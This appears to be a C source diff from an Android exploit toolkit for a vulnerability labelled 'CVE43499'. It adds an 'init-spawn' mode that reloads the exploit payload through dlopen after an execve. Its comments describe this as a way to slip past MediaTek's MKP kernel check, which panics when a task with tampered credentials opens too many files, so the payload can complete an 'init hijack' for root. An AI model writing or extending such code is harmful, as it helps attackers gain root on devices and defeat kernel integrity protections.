@@ -966,10 +966,49 @@ static int payload_runner_main(int argc, char **argv) {
   return 0;
 }
 
+/*
+ * Re-enter a payload for the one step it cannot take in the process that ran
+ * it: the init hijack, on the far side of an execve.
+ *
+ * A kernel that watches for a task whose cred does not match what it recorded
+ * -- MediaTek's MKP is the one this was written for -- counts every file such
+ * a task opens and panics past a threshold. A cred write is that mismatch, so
+ * the rooted task has a budget of opens, and the hijack alone spends more than
+ * it. execve installs a cred the kernel made, which resets the count to
+ * nothing; this is the process on the other side of it.
+ *
+ * Not --run-payload with an extra flag: that one opens and truncates a log,
+ * and this process is inheriting the log of the run that spawned it. The
+ * payload's own supervisor answers CVE43499_INIT_SPAWN before it starts an
+ * attempt, so what dlopen() reaches here is the hijack rather than a run.
+ *
+ *   argv: --init-spawn <payload.so> <helper> <client uid>
+ */
+static int payload_init_spawn_main(int argc, char **argv) {
+  if (argc != 5) {
+    return 2;
+  }
+  if (setenv("CVE43499_ROOT_HELPER", argv[3], 1) != 0 ||
+      setenv("CVE43499_INIT_SPAWN", argv[4], 1) != 0) {
+    return errno ? errno : EINVAL;
+  }
+  void *handle = dlopen(argv[2], RTLD_NOW | RTLD_LOCAL);
+  if (!handle) {
+    dprintf(STDERR_FILENO, "[init-spawn] dlopen failed: %s\n", dlerror());
+    return ENOEXEC;
+  }
+  /* Not reached: the payload's constructor _exit()s with its own status. */
+  dprintf(STDERR_FILENO, "[init-spawn] payload did not take the verb\n");
+  return ENOEXEC;
+}
+
 int main(int argc, char **argv) {
   signal(SIGPIPE, SIG_IGN);
   if (argc >= 2 && strcmp(argv[1], "--run-payload") == 0) {
     return payload_runner_main(argc, argv);
+  }
+  if (argc >= 2 && strcmp(argv[1], "--init-spawn") == 0) {
+    return payload_init_spawn_main(argc, argv);
   }
   if (argc >= 2 && strcmp(argv[1], "--daemon") == 0) {
     return daemon_main();
